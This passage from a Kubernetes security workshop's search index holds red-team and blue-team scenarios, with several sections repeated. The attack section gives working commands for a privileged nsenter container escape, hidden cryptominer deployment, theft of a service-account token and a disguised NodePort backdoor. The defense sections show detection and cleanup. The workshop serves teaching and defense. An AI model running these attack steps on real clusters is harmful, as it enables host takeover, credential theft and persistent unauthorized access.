the production ops dashboard, and ask if Blue can delete it for them. Blue makes a mental note about the nodePort and then opens a browser to the cluster log system , making sure to go to the Legacy Logs Viewer. Once there, Blue clicks on the small \"down arrow\" on the far right of the \"Filter by label or text\" search bar, selects \"Convert to advanced filter\", and puts the following query into the search filter area: resource.type=\"k8s_cluster\" protoPayload.authorizationInfo.permission=\"io.k8s.apps.v1.deployments.create\" Blue sees that the default Kubernetes serviceaccount was the creator of the bitcoinero deployment . Back in the Cloud Shell terminal, Blue runs the following to list the pods running with the default serviceaccount in the prd namespace : kubectl get pods -n prd -o jsonpath='{range .items[?(@.spec.serviceAccountName==\"default\")]}{.metadata.name}{\" \"}{.spec.serviceAccountName}{\"\\n\"}{end}'","title":"Confirming the Foreign Workload"},{"location":"scenario_1_defense/#cleaning-up","text":"Unsure of exactly how a pod created another pod , Blue decides that it's now 3am, and the commands are blurring together. The website is still slow, so Blue decides to find and delete the deployment : kubectl get deployments -n prd kubectl delete deployment bitcoinero -n prd They also keep their promise, and delete the nodePort : kubectl get services -n prd kubectl delete service dashboard -n prd","title":"Cleaning Up"},{"location":"scenario_1_defense/#installing-security-visibility","text":"It's now very clear to Blue that without additional information, it's difficult to determine exactly who or what created that bitcoinero deployment. Was it code? Was it a human? Blue suspects it was one of the engineers on the team, but there's not much they can do without proof. Remembering that this cluster doesn't have any runtime behavior monitoring and detection software installed, Blue decides to install Sysdig's Falco using an all-in-one manifest from a prominent blogger. kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security.yml Just to make sure it's working, Blue runs the following command to get the logs from the deployed Falco pod(s) : kubectl logs -n falco $(kubectl get pod -n falco -l app=falco -o=name) -f","title":"Installing Security Visibility"},{"location":"scenario_1_defense/#ensuring-security-log-flow","text":"Going back to the logging system , Blue enters another log filter using the \"advanced filter\" with the following query to confirm it's receiving all the logs coming from the Falco deployment : resource.type=k8s_container resource.labels.namespace_name=\"falco\" resource.labels.container_name=\"falco\"","title":"Ensuring Security Log Flow"},{"location":"scenario_1_defense/#reviewing-the-falco-rules","text":"Falco Kubernetes Rules: kubectl get configmaps -n falco falco-config -o json | jq -r '.data.\"falco_rules.yaml\"' | grep rule: Kubernetes Audit Rules (Not applicable on GKE): kubectl get configmaps -n falco falco-config -o json | jq -r '.data.\"k8s_audit_rules.yaml\"' | grep rule:","title":"Reviewing the Falco Rules:"},{"location":"scenario_1_defense/#giving-the-all-clear","text":"Seeing what looks like a \"happy\" cluster , Blue emails their boss that there was a workload using too many resources that wasn't actually needed, so it was deleted. Also, they added some additional \"security\" just in case.","title":"Giving the \"All Clear\""},{"location":"scenario_2_attack/","text":"Persistence: Scenario 2 Attack \u00b6 Backstory \u00b6 Name: DarkRed \u00b6 Highly Skilled Sells Exfiltrated Data for $$ Evades detection and employs persistence Uses env-specific tooling Creates bespoke payloads Expert Kubernetes knowledge Motivations \u00b6 Red notices that the website is gone and the cryptominers have stopped reporting in. Red asks DarkRed for help trying to get back into the Kubernetes cluster and gives DarkRed the IP address. Red will split the revenue if DarkRed can get the miners back up and running. Initial Foothold \u00b6 Seeing that the URL included port 31337 and that Red said it was a Kubernetes cluster , it was likely to be exposed via a NodePort service . With this information, she has a feeling that more services might still be exposed to the web this way. DarkRed starts with indirect enumeration, such as searching on shodan.io, and follows up with direct port scanning via nmap . To see what she'd see, from the Cloud Shell Terminal, scan the hundred ports around 31337 using a command similar to \"nmap -sT -A -p 31300-31399 -T4 -n -v -Pn your-ip-address-goes-here\". Be absolutely sure to scan your assigned IP address. Your Cloud Shell has a little script to help: ./attack-2-helper.sh This scan confirms DarkRed's suspicion that more services were present in this cluster . They all look like webservers, so explore them briefly with your browser. DarkRed notices that two of the services look like the company's main product, but the third is a juicy ops dashboard. Her intuition says that the dashboard is probably not maintained as carefully as the real product, and she focuses her attention there. Using tools such as dirb , sqlmap , nikto , and burp , she explores the dashboard, finds a vulnerability in a common web-development library, and exploits it to gain remote code execution on the server. For convenience, DarkRed installs a webshell for further exploration. Now, let's become DarkRed and leverage this new access: Deploying Miners \u00b6 The webshell can be found at http://your-ip:31336/webshell/ , and uses your workshop credentials as before. Your Cloud Shell has a little script to help: ./attack-2-helper.sh Run a few commands to make sure it's working and gather some basic information: id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube Review the information. Check for Kubernetes access, and find the limits of our permissions: export PATH=/tmp:$PATH cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.16.4/bin/linux/amd64/kubectl; chmod 555 kubectl kubectl get pods kubectl get pods --all-namespaces kubectl get nodes kubectl auth can-i --list Now that we've reviewed the basic limits of our access, let's see if we can take over the host. If we can, that will give us many more options to fulfill our nefarious whims. Using a neat trick from Twitter , let's attempt to deploy a container that gives us full host access: kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"imagePullPolicy\":\"IfNotPresent\",\"securityContext\":{\"privileged\":true}}]}}' Let's unpack this a little bit: The kubectl run gets us a pod with a container, but the --overrides argument makes it special. First we see \"hostPID\": true , which breaks down the most fundamental isolation of containers, letting us see all processes as if we were on the host. Next, we use the nsenter command to switch to a different mount namespace. Which one? Whichever one init (pid 1) is running in, since that's guaranteed to be the host mount namespace! The result is similar to doing a HostPath mount and chroot -ing into it, but this works at a lower level, breaking down the mount namespace isolation completely. The privileged security context is necessary to prevent a permissions error accessing /proc/1/ns/mnt . Convince yourself that you're really on the host, using some of our earlier enumeration commands: id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube It's been said that \"if you have to SSH into a server for troubleshooting, you're doing Kubernetes wrong\", so it's unlikely that cluster administrators are SSHing into nodes and running commands like docker ps directly. By deploying our bitcoinero container via Docker on the host, it will show up in a docker ps listing. However, Docker is managing the container directly and not the kubelet , so the malicious container won't show up in a kubectl get pods listing. Without additional detection capabilities, it's likely that the cluster administrator will never even notice. First we verify Docker is working as expected, then deploy our cryptominer, and validate it seems to be running. docker ps docker run -d securekubernetes/bitcoinero -c1 -l10 docker container ls Digging In \u00b6 Now that DarkRed has fulfilled her end of the agreement and the miners are reporting in again, she decides to explore the cluster. With root access to the host, it's easy to explore any and all of the containers. Inspecting the production web app gives access to a customer database that may be useful later -- she grabs a copy of it for \"safekeeping\". It would be nice to leave a backdoor for future access. Let's become DarkRed again and see what we can do: First, let's steal the kubelet's client certificate, and check to see if it has heightened permissions: ps -ef | grep kubelet Note the path to the kubelet's kubeconfig file: /var/lib/kubelet/kubeconfig kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system Looks good! Let's try it: kubectl --kubeconfig /var/lib/kubelet/kubeconfig run testing --image=busybox --rm -i -t -n kube-system --command echo \"success\" Oh no! This isn't going to work. Let's try stealing the default kube-system service account token and check those permissions. We'll need to do a little UNIX work to find them, since we're not exactly using the public API. TOKEN=$(for i in `mount | sed -n '/secret/ s/^tmpfs on \\(.*default.*\\) type tmpfs.*$/\\1\\/namespace/p'`; do if [ `cat $i` = 'kube-system' ]; then cat `echo $i | sed 's/.namespace$/\\/token/'`; break; fi; done) echo -e \"\\n\\nYou'll want to copy this for later:\\n\\nTOKEN=\\\"$TOKEN\\\"\" kubectl --token \"$TOKEN\" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT auth can-i get secrets --all-namespaces Yes, this looks better! We save that token in our PalmPilot for later use, and publish a NodePort that will let us access the cluster remotely in the future: cat <<EOF | kubectl --token \"$TOKEN\" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT apply -f - apiVersion: v1 kind: Service metadata: name: istio-mgmt namespace: kube-system spec: type: NodePort ports: - protocol: TCP nodePort: 31313 port: 31313 targetPort: $KUBERNETES_SERVICE_PORT --- apiVersion: v1 kind: Endpoints metadata: name: istio-mgmt namespace: kube-system subsets: - addresses: - ip: `sed -n 's/^ *server: https:\\/\\///p' /var/lib/kubelet/kubeconfig` ports: - port: $KUBERNETES_SERVICE_PORT EOF Press control-d to exit (and delete) the r00t pod. If you like, you may validate that external access is working, using cloud shell: if [ -z \"$TOKEN\" ]; then echo -e \"\\n\\nPlease paste in the TOKEN=\\\"...\\\" line and try again.\" else EXTERNAL_IP=`gcloud compute instances list --format json | jq '.[0][\"networkInterfaces\"][0][\"accessConfigs\"][0][\"natIP\"]' | sed 's/\"//g'` kubectl --token \"$TOKEN\" --insecure-skip-tls-verify --server \"https://${EXTERNAL_IP}:31313\" get pods --all-namespaces fi Now we have remote Kubernetes access, and our associate's bitcoinero containers are invisible. All in a day's work.","title":"Scenario 2 Attack"},{"location":"scenario_2_attack/#persistence-scenario-2-attack","text":"","title":"Persistence: Scenario 2 Attack"},{"location":"scenario_2_attack/#backstory","text":"","title":"Backstory"},{"location":"scenario_2_attack/#name-darkred","text":"Highly Skilled Sells Exfiltrated Data for $$ Evades detection and employs persistence Uses env-specific tooling Creates bespoke payloads Expert Kubernetes knowledge","title":"Name: DarkRed"},{"location":"scenario_2_attack/#motivations","text":"Red notices that the website is gone and the cryptominers have stopped reporting in. Red asks DarkRed for help trying to get back into the Kubernetes cluster and gives DarkRed the IP address. Red will split the revenue if DarkRed can get the miners back up and running.","title":"Motivations"},{"location":"scenario_2_attack/#initial-foothold","text":"Seeing that the URL included port 31337 and that Red said it was a Kubernetes cluster , it was likely to be exposed via a NodePort service . With this information, she has a feeling that more services might still be exposed to the web this way. DarkRed starts with indirect enumeration, such as searching on shodan.io, and follows up with direct port scanning via nmap . To see what she'd see, from the Cloud Shell Terminal, scan the hundred ports around 31337 using a command similar to \"nmap -sT -A -p 31300-31399 -T4 -n -v -Pn your-ip-address-goes-here\". Be absolutely sure to scan your assigned IP address. Your Cloud Shell has a little script to help: ./attack-2-helper.sh This scan confirms DarkRed's suspicion that more services were present in this cluster . They all look like webservers, so explore them briefly with your browser. DarkRed notices that two of the services look like the company's main product, but the third is a juicy ops dashboard. Her intuition says that the dashboard is probably not maintained as carefully as the real product, and she focuses her attention there. Using tools such as dirb , sqlmap , nikto , and burp , she explores the dashboard, finds a vulnerability in a common web-development library, and exploits it to gain remote code execution on the server. For convenience, DarkRed installs a webshell for further exploration. Now, let's become DarkRed and leverage this new access:","title":"Initial Foothold"},{"location":"scenario_2_attack/#deploying-miners","text":"The webshell can be found at http://your-ip:31336/webshell/ , and uses your workshop credentials as before. Your Cloud Shell has a little script to help: ./attack-2-helper.sh Run a few commands to make sure it's working and gather some basic information: id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube Review the information. Check for Kubernetes access, and find the limits of our permissions: export PATH=/tmp:$PATH cd /tmp; curl -LO https://storage.googleapis.com/kubernetes-release/release/v1.16.4/bin/linux/amd64/kubectl; chmod 555 kubectl kubectl get pods kubectl get pods --all-namespaces kubectl get nodes kubectl auth can-i --list Now that we've reviewed the basic limits of our access, let's see if we can take over the host. If we can, that will give us many more options to fulfill our nefarious whims. Using a neat trick from Twitter , let's attempt to deploy a container that gives us full host access: kubectl run r00t --restart=Never -ti --rm --image lol --overrides '{\"spec\":{\"hostPID\": true, \"containers\":[{\"name\":\"1\",\"image\":\"alpine\",\"command\":[\"nsenter\",\"--mount=/proc/1/ns/mnt\",\"--\",\"/bin/bash\"],\"stdin\": true,\"tty\":true,\"imagePullPolicy\":\"IfNotPresent\",\"securityContext\":{\"privileged\":true}}]}}' Let's unpack this a little bit: The kubectl run gets us a pod with a container, but the --overrides argument makes it special. First we see \"hostPID\": true , which breaks down the most fundamental isolation of containers, letting us see all processes as if we were on the host. Next, we use the nsenter command to switch to a different mount namespace. Which one? Whichever one init (pid 1) is running in, since that's guaranteed to be the host mount namespace! The result is similar to doing a HostPath mount and chroot -ing into it, but this works at a lower level, breaking down the mount namespace isolation completely. The privileged security context is necessary to prevent a permissions error accessing /proc/1/ns/mnt . Convince yourself that you're really on the host, using some of our earlier enumeration commands: id; uname -a; cat /etc/lsb-release /etc/redhat-release; ps -ef; env | grep -i kube It's been said that \"if you have to SSH into a server for troubleshooting, you're doing Kubernetes wrong\", so it's unlikely that cluster administrators are SSHing into nodes and running commands like docker ps directly. By deploying our bitcoinero container via Docker on the host, it will show up in a docker ps listing. However, Docker is managing the container directly and not the kubelet , so the malicious container won't show up in a kubectl get pods listing. Without additional detection capabilities, it's likely that the cluster administrator will never even notice. First we verify Docker is working as expected, then deploy our cryptominer, and validate it seems to be running. docker ps docker run -d securekubernetes/bitcoinero -c1 -l10 docker container ls","title":"Deploying Miners"},{"location":"scenario_2_attack/#digging-in","text":"Now that DarkRed has fulfilled her end of the agreement and the miners are reporting in again, she decides to explore the cluster. With root access to the host, it's easy to explore any and all of the containers. Inspecting the production web app gives access to a customer database that may be useful later -- she grabs a copy of it for \"safekeeping\". It would be nice to leave a backdoor for future access. Let's become DarkRed again and see what we can do: First, let's steal the kubelet's client certificate, and check to see if it has heightened permissions: ps -ef | grep kubelet Note the path to the kubelet's kubeconfig file: /var/lib/kubelet/kubeconfig kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system Looks good! Let's try it: kubectl --kubeconfig /var/lib/kubelet/kubeconfig run testing --image=busybox --rm -i -t -n kube-system --command echo \"success\" Oh no! This isn't going to work. Let's try stealing the default kube-system service account token and check those permissions. We'll need to do a little UNIX work to find them, since we're not exactly using the public API. TOKEN=$(for i in `mount | sed -n '/secret/ s/^tmpfs on \\(.*default.*\\) type tmpfs.*$/\\1\\/namespace/p'`; do if [ `cat $i` = 'kube-system' ]; then cat `echo $i | sed 's/.namespace$/\\/token/'`; break; fi; done) echo -e \"\\n\\nYou'll want to copy this for later:\\n\\nTOKEN=\\\"$TOKEN\\\"\" kubectl --token \"$TOKEN\" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT auth can-i get secrets --all-namespaces Yes, this looks better! We save that token in our PalmPilot for later use, and publish a NodePort that will let us access the cluster remotely in the future: cat <<EOF | kubectl --token \"$TOKEN\" --insecure-skip-tls-verify --server=https://$KUBERNETES_SERVICE_HOST:$KUBERNETES_SERVICE_PORT apply -f - apiVersion: v1 kind: Service metadata: name: istio-mgmt namespace: kube-system spec: type: NodePort ports: - protocol: TCP nodePort: 31313 port: 31313 targetPort: $KUBERNETES_SERVICE_PORT --- apiVersion: v1 kind: Endpoints metadata: name: istio-mgmt namespace: kube-system subsets: - addresses: - ip: `sed -n 's/^ *server: https:\\/\\///p' /var/lib/kubelet/kubeconfig` ports: - port: $KUBERNETES_SERVICE_PORT EOF Press control-d to exit (and delete) the r00t pod. If you like, you may validate that external access is working, using cloud shell: if [ -z \"$TOKEN\" ]; then echo -e \"\\n\\nPlease paste in the TOKEN=\\\"...\\\" line and try again.\" else EXTERNAL_IP=`gcloud compute instances list --format json | jq '.[0][\"networkInterfaces\"][0][\"accessConfigs\"][0][\"natIP\"]' | sed 's/\"//g'` kubectl --token \"$TOKEN\" --insecure-skip-tls-verify --server \"https://${EXTERNAL_IP}:31313\" get pods --all-namespaces fi Now we have remote Kubernetes access, and our associate's bitcoinero containers are invisible. All in a day's work.","title":"Digging In"},{"location":"scenario_2_defense/","text":"Persistence: Scenario 2 Defense \u00b6 Backstory \u00b6 Name: Blue \u00b6 Still overworked Still can only do the bare minimum Uses the defaults when configuring systems Usually gets blamed for stability or security issues Motivations \u00b6 A week after the first incident, Blue gets paged at 3am because \u201cthe website is slow again\u201d. Blue , puzzled, takes another look. Blue decides to dust off the r\u00e9sum\u00e9 \u201cjust in case\u201d. Defense \u00b6 Blue is paged again with the same message as last time. What is going on? Could this be the same problem again? Identifying the Issue \u00b6 Let's run some basic checks again to see if we can find random workloads: kubectl get pods --all-namespaces There does not appear to be any unusual workloads running on our cluster. Just to be sure, let's check our cluster's resource consumption: kubectl top node and kubectl top pod --all-namespaces So far, everything looks normal. What gives? Hold on. We installed falco last time and it is throwing us alerts in StackDriver. In a new StackDriver window , let's run the query: resource.type=\"k8s_container\" resource.labels.container_name:\"falco\" jsonPayload.rule=\"Launch Privileged Container\" OR jsonPayload.rule=\"Terminal shell in container\" We're looking for container logs from falco where triggered rules are privileged containers or interactive shells. Huh. This is odd. A privileged alpine container, but no other information to go off of? What can Kubernetes cluster logs tell us about this alpine container? In a new StackDriver window , let's run this query: resource.type=k8s_cluster protoPayload.request.spec.containers.image=\"alpine\" So, we see a few things: A create event that was authorized with the system:serviceaccount:dev:default serviceaccount in the dev namespace. A pod named r00t got created The pod command is nsenter --mount=/proc/1/ns/mnt -- /bin/bash The securityContext is privileged: true The hostPID is set to true This is not looking good. Can we see what this container did? In a new StackDriver window , let's search for this r00t container logs: resource.type=\"k8s_container\" resource.labels.pod_name:r00t Wow. We can see someone was running commands from this container. But wait, they can run docker commands? How can they talk to the docker on the host from the container? OH NO! They must have broken out of the container and by this point they're on the host! That bitcoinero container again must be what's causing slowness. But, they're trying to do something else. They tried to create a pod, but failed. So, they created a Service and an Endpoint. They must be trying to open a backdoor of some sort to get back in later. In cloud shell, let's check if those exist: kubectl -n kube-system get svc,ep That's one sneaky hacker, for sure. But, jokes on them, We're not using service mesh. Let's delete that service (the endpoint will be deleted too): kubectl -n kube-system delete svc/istio-mgmt But, I want to know how did they get in in the first place?!?!?! The create event authorized because of the dev:default serviceaccount. So, what is in dev namespace that led to someone taking over the entire host? kubectl -n dev get pods There is an app , a db , and a dashboard . Wait a second! Could it be an exposed dashboard? kubectl -n dev logs $(kubectl -n dev get pods -o name | grep dashboard) -c dashboard kubectl -n dev logs $(kubectl -n dev get pods -o name | grep dashboard) -c authproxy It is an exposed dashboard. That's how they got in. There is GET /webshell in authproxy logs with the source IP. We might want to revoke that serviceaccount token: kubectl -n dev delete $(kubectl -n dev get secret -o name| grep default) And perhaps disable the automatic mounting of serviceaccount tokens by setting automountServiceAccountToken: false in the pod spec, if the dashboard doesn't need it. But, how can we mitigate this further? The attacker ran a privileged container, which they shouldn't have been able to. So, we should block that. I remember a talk at KubeCon this week about Open-Policy-Agent/Gatekeeper that gets deployed as an admission controller. That should work because an admission controller is a piece of code that intercepts requests to the Kubernetes API server after the request is authenticated and authorized. So, we should set two policies: Deny privileged containers. Allow only the images we expect to have in dev and prd namespaces. First, let's apply Gatekeeper itself: kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2.yaml Second, let's apply the policies. If you receive an error about no matches for kind... in version ... , this means Gatekeeper has not kicked into gear yet. Wait a few seconds then re-apply policies: kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2-policies.yaml Let's see if this actually works by trying to run some containers that violate these policies. First, let's try to run privileged container: kubectl apply -f - <<EOF apiVersion: v1 kind: Pod metadata: name: nginx labels: app: nginx spec: containers: - name: nginx image: nginx ports: - containerPort: 80 securityContext: privileged: true EOF We see that Kubernetes denied this request for 2 reasons (not whitelisted image and privileged), as expected. Let's try running a non-whitelisted image: kubectl -n dev run alpine --image=alpine --restart=Never We see that Kubernetes rejected this request again due to image not being whitelisted/allowed, as expected. Can we still run pods that meet/satisfy the Gatekeeper policies? Let's find out: kubectl -n dev run ubuntu --image=ubuntu --restart=Never Yes, looks like we can run pods that satisfy the policies and requirements we set on our cluster. Even though we applied Falco and Gatekeeper, we should not continue to use this cluster since it has been compromised. We should create a new cluster and re-deploy our applications there once we've hardened and secured it enough.","title":"Scenario 2 Defense"},{"location":"scenario_2_defense/#persistence-scenario-2-defense","text":"","title":"Persistence: Scenario 2 Defense"},{"location":"scenario_2_defense/#backstory","text":"","title":"Backstory"},{"location":"scenario_2_defense/#name-blue","text":"Still overworked Still can only do the bare minimum Uses the defaults when configuring systems Usually gets blamed for stability or security issues","title":"Name: Blue"},{"location":"scenario_2_defense/#motivations","text":"A week after the first incident, Blue gets paged at 3am because \u201cthe website is slow again\u201d. Blue , puzzled, takes another look. Blue decides to dust off the r\u00e9sum\u00e9 \u201cjust in case\u201d.","title":"Motivations"},{"location":"scenario_2_defense/#defense","text":"Blue is paged again with the same message as last time. What is going on? Could this be the same problem again?","title":"Defense"},{"location":"scenario_2_defense/#identifying-the-issue","text":"Let's run some basic checks again to see if we can find random workloads: kubectl get pods --all-namespaces There does not appear to be any unusual workloads running on our cluster. Just to be sure, let's check our cluster's resource consumption: kubectl top node and kubectl top pod --all-namespaces So far, everything looks normal. What gives? Hold on. We installed falco last time and it is throwing us alerts in StackDriver. In a new StackDriver window , let's run the query: resource.type=\"k8s_container\" resource.labels.container_name:\"falco\" jsonPayload.rule=\"Launch Privileged Container\" OR jsonPayload.rule=\"Terminal shell in container\" We're looking for container logs from falco where triggered rules are privileged containers or interactive shells. Huh. This is odd. A privileged alpine container, but no other information to go off of? What can Kubernetes cluster logs tell us about this alpine container? In a new StackDriver window , let's run this query: resource.type=k8s_cluster protoPayload.request.spec.containers.image=\"alpine\" So, we see a few things: A create event that was authorized with the system:serviceaccount:dev:default serviceaccount in the dev namespace. A pod named r00t got created The pod command is nsenter --mount=/proc/1/ns/mnt -- /bin/bash The securityContext is privileged: true The hostPID is set to true This is not looking good. Can we see what this container did? In a new StackDriver window , let's search for this r00t container logs: resource.type=\"k8s_container\" resource.labels.pod_name:r00t Wow. We can see someone was running commands from this container. But wait, they can run docker commands? How can they talk to the docker on the host from the container? OH NO! They must have broken out of the container and by this point they're on the host! That bitcoinero container again must be what's causing slowness. But, they're trying to do something else. They tried to create a pod, but failed. So, they created a Service and an Endpoint. They must be trying to open a backdoor of some sort to get back in later. In cloud shell, let's check if those exist: kubectl -n kube-system get svc,ep That's one sneaky hacker, for sure. But, jokes on them, We're not using service mesh. Let's delete that service (the endpoint will be deleted too): kubectl -n kube-system delete svc/istio-mgmt But, I want to know how did they get in in the first place?!?!?! The create event authorized because of the dev:default serviceaccount. So, what is in dev namespace that led to someone taking over the entire host? kubectl -n dev get pods There is an app , a db , and a dashboard . Wait a second! Could it be an exposed dashboard? kubectl -n dev logs $(kubectl -n dev get pods -o name | grep dashboard) -c dashboard kubectl -n dev logs $(kubectl -n dev get pods -o name | grep dashboard) -c authproxy It is an exposed dashboard. That's how they got in. There is GET /webshell in authproxy logs with the source IP. We might want to revoke that serviceaccount token: kubectl -n dev delete $(kubectl -n dev get secret -o name| grep default) And perhaps disable the automatic mounting of serviceaccount tokens by setting automountServiceAccountToken: false in the pod spec, if the dashboard doesn't need it. But, how can we mitigate this further? The attacker ran a privileged container, which they shouldn't have been able to. So, we should block that. I remember a talk at KubeCon this week about Open-Policy-Agent/Gatekeeper that gets deployed as an admission controller. That should work because an admission controller is a piece of code that intercepts requests to the Kubernetes API server after the request is authenticated and authorized. So, we should set two policies: Deny privileged containers. Allow only the images we expect to have in dev and prd namespaces. First, let's apply Gatekeeper itself: kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2.yaml Second, let's apply the policies. If you receive an error about no matches for kind... in version ... , this means Gatekeeper has not kicked into gear yet. Wait a few seconds then re-apply policies: kubectl apply -f https://raw.githubusercontent.com/securekubernetes/securekubernetes/master/manifests/security2-policies.yaml Let's see if this actually works by trying to run some containers that violate these policies. First, let's try to run privileged container: kubectl apply -f - <<EOF apiVersion: v1 kind: Pod metadata: name: nginx labels: app: nginx spec: containers: - name: nginx image: nginx ports: - containerPort: 80 securityContext: privileged: true EOF We see that Kubernetes denied this request for 2 reasons (not whitelisted image and privileged), as expected. Let's try running a non-whitelisted image: kubectl -n dev run alpine --image=alpine --restart=Never We see that Kubernetes rejected this request again due to image not being whitelisted/allowed, as expected. Can we still run pods that meet/satisfy the Gatekeeper policies? Let's find out: kubectl -n dev run ubuntu --image=ubuntu --restart=Never Yes, looks like we can run pods that satisfy the policies and requirements we set on our cluster. Even though we applied Falco and Gatekeeper, we should not continue to use this cluster since it has been compromised. We should create a new cluster and re-deploy our applications there once we've hardened and secured it enough.","title":"Identifying the Issue"},{"location":"wrapup/","text":"Wrap-up \u00b6 Congrats! Remember to delete your project so it won't keep running and accruing charges! You can delete it through the web interface, or with the following gcloud command: gcloud projects delete \"${DEVSHELL_PROJECT_ID}\"","title":"Wrap Up"},{"location":"wrapup/#wrap-up","text":"Congrats! Remember to delete your project so it won't keep running and accruing charges! You can delete it through the web interface, or with the following gcloud command: gcloud projects delete \"${DEVSHELL_PROJECT_ID}\"","title":"Wrap-up"}]}